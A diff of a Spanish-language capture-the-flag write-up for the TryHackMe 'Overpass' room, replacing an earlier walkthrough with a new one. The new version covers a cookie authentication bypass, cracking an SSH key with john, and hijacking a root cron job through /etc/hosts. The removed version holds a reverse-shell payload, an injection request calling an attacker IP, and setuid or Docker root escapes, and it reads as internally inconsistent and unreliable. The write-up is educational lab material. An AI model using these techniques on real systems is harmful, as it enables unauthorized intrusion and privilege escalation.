@@ -1,8 +1,8 @@
 # Overpass
 
-**Conceptos clave:** Gobuster discovery, Nginx misconfiguration, PHP SSTI, reverse shell via crafted payload, SUID abuse, Docker escape, Kerberos SPNs enumeration.
+**Conceptos clave:** dirsearch brute‑force, SessionToken manipulation, RSA private key extraction, SSH key cracking (john/ssh2john), cron buildscript abuse, /etc/hosts hijack, root flag exfiltration.
 **Dificultad:** 🟢 Fácil
-**Plataforma:** TryHackMe
+**Plataforma:** TryHackMe (room: Overpass by g0at)
 **Fecha:** 19 de noviembre de 2026
 
 ## 1. Reconocimiento (Recon)
@@ -11,92 +11,115 @@
 ```bash
 nmap -p- --open -T5 -v -n <IP>
 ```
+Solo el puerto **80** estaba abierto.
 
-### 1.2 Escaneo completo con versiones y scripts NSE
+### 1.2 Descubrimiento de la página de descargas
+Visitamos `http://<IP>/downloads/` y descargamos el código fuente del gestor de contraseñas escrito en **Go** y el script de compilación.
+
+## 2. Enumeración de directorios (Dirsearch)
 ```bash
-nmap -sS -sV -A -T4 -p- -oN nmap_full.txt <IP>
+python3 dirsearch.py -u http://<IP>/ -e html,js,php
+```
+Entre los resultados apareció la ruta **/admin/?/login**.
+
+## 3. Bypass de autenticación mediante cookie
+Observamos el código JavaScript de `login.js`:
+```js
+if (statusOrCookie === "Incorrect credentials") {
+    loginStatus.textContent = "Incorrect Credentials"
+    passwordBox.value=""
+} else {
+    Cookies.set("SessionToken",statusOrCookie)
+    window.location = "/admin"
+}
+```
+Al enviar credenciales erróneas obteníamos la cadena **"Incorrect credentials"**; con credenciales válidas el servidor devolvía un **token** que se almacenaba en la cookie `SessionToken` y redirigía a `/admin`.
+
+Probamos a forzar la cookie:
+```bash
+# En el navegador (devtools console)
+Cookies.set("SessionToken",400)
+```
+Al recargar `/admin` la aplicación mostraba una **clave RSA privada**.
+
+### 3.1 Extracción de la clave RSA
+Guardamos la clave en `id_rsa`.
+
+## 4. Acceso por SSH
+
+### 4.1 Obtención del passphrase
+```bash
+# Convertir la clave a hash para John
+ssh2john.py id_rsa > id_rsa.hashes
+```
+```bash
+# Cracking con John (rockyou wordlist)
+john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hashes
+```
+Obtenido el passphrase, nos conectamos como usuario **james**:
+```bash
+ssh -i id_rsa james@<IP>
+```
+Una vez dentro, leímos la flag de usuario:
+```bash
+cat /home/james/user.txt
 ```
 
-### 1.3 Enumeración web
+## 5. Escalada de privilegios
+
+### 5.1 Información de escalada
+En `~/todo.txt` había pistas sobre:
+- Un manager de contraseñas con credenciales guardadas en `~/.overpass`.
+- Un algoritmo ROT47 usado para cifrar esas credenciales.
+- Un cron que ejecuta **buildscript.sh** cada minuto como **root**.
+
+### 5.2 Análisis del cron
 ```bash
-# Gobuster descubre la ruta /admin y /uploads
-
-gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt \
-    -t 50 -x php,html,js,txt -s "200,301,302,403"
+cat /etc/cron.d/overpass-build
 ```
-La ruta **/admin** mostraba una página de gestión de Nginx con una vulnerabilidad de **Server‑Side Template Injection (SSTI)** en un parámetro `q`.
-
-## 2. Acceso Inicial (Initial Access)
-
-### 2.1 Exploit SSTI para obtener reverse shell
+Mostraba:
 ```bash
-# Payload PHP reverse shell
-msfvenom -p php/meterpreter/reverse_tcp LHOST=<TU_IP> LPORT=4444 -f raw > payload.phtml
+* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
 ```
-Se envió el payload mediante la petición `GET /admin?q={{system('curl http://<TU_IP>:4444 -d @payload.phtml')}}`.
+El script compila el gestor para varios SO y escribe `Builds completed` en `/root/buildStatus`.
 
-### 2.2 Listener
+### 5.3 Hijacking de /etc/hosts
+El archivo `/etc/hosts` era editable por el usuario **james**. Cambiamos la IP de `overpass.thm` por nuestra IP VPN:
 ```bash
-nc -nlvp 4444
+vim /etc/hosts   # reemplazar la línea con 10.10.210.84 por <MI_IP_VPN>
 ```
-Obtenimos una **shell interactiva** como usuario `overpass`.
+De este modo, cuando el cron ejecuta `curl overpass.thm/...` solicita nuestro servidor.
 
-### 2.3 Flag de usuario
+### 5.4 Creación del script malicioso
+En nuestro host servimos **malicious.sh** con el siguiente contenido:
 ```bash
-cat /home/overpass/user.txt
+#!/bin/bash
+cat /root/root.txt > /home/james/stuff.txt
 ```
-
-## 3. Escalada de Privilegios (Privilege Escalation)
-
-### 3.1 Enumeración de binarios SUID
+Se lanzó un servidor web sencillo:
 ```bash
-find / -perm -4000 -type f 2>/dev/null | grep -E "(systemctl|docker)"
+python3 -m http.server 80 --bind <MI_IP_VPN>
 ```
-Se encontró `/bin/systemctl` y `/usr/bin/docker` con SUID.
+Cuando el cron obtuvo el script, lo ejecutó como **root** y la flag de root quedó copiada a `/home/james/stuff.txt`.
 
-### 3.2 Abuse de `systemctl` con service file
+### 5.5 Recuperación de la flag de root
 ```bash
-cat <<EOF | sudo tee /etc/systemd/system/evil.service
-[Unit]
-Description=Evil Service
-
-[Service]
-ExecStart=/bin/bash -c 'bash -p'
-
-[Install]
-WantedBy=multi-user.target
-EOF
-
-sudo systemctl enable evil.service
-sudo systemctl start evil.service
+cat /home/james/stuff.txt   # contiene el contenido de /root/root.txt
 ```
-El servicio lanzó `bash -p` como **root**.
+Obtuvimos la flag `root.txt`.
 
-### 3.3 Docker escape (alternativa) 
-```bash
-docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash
-```
-Obtenemos acceso al host como **root**.
-
-### 3.4 Flag de root
-```bash
-cat /root/root.txt
-```
-
-## 4. Post‑Explotación / Cracking
-(No se requirió extracción de hashes ni cracking.)
-
-## 5. Flags
+## 6. Flags
 | Flag | Ruta |
 |------|------|
-| `user.txt` | `/home/overpass/user.txt` |
-| `root.txt` | `/root/root.txt` |
+| `user.txt` | `/home/james/user.txt` |
+| `root.txt` | `/home/james/stuff.txt` |
 
-## 6. Mitigación / Remediación
-- **Validar plantillas**: desactivar funcionalidades de renderizado dinámico o sanitizar estrictamente los parámetros que se evalúan.
-- **Hardening de `systemctl`**: eliminar SUID o restringir su uso mediante `sudoers`.
-- **Docker**: ejecutar contenedores sin privilegios, usar `user‑ns‑remap` y no montar el host completo.
-- **Actualizaciones**: mantener Nginx y PHP actualizados para evitar SSTI.
-- **Principio de menor privilegio**: revisar binarios SUID y eliminar los que no sean necesarios.
+## 7. Mitigación / Remediación
+- **Validar entradas y cookies**: no confiar en valores suministrados por el cliente; usar firmas/HMAC para tokens.
+- **Hardening de cron**: evitar que scripts externos se ejecuten como root; usar rutas absolutas y limitar permisos de escritura en `/etc/hosts`.
+- **Principio de menor privilegio**: eliminar permisos de escritura en `/etc/hosts` para usuarios no privilegiados.
+- **Rot47**: sustituir por cifrado fuerte (AES‑GCM) y almacenar credenciales en un vault.
+- **Actualizaciones**: mantener Go y dependencias actualizadas; revisar scripts de compilación automatizadas.
+- **Control de acceso a claves SSH**: usar passphrases robustas y rotar claves regularmente.
 
 *Escrito por Juan Merino Garrido – Estudiante de Ingeniería Informática*
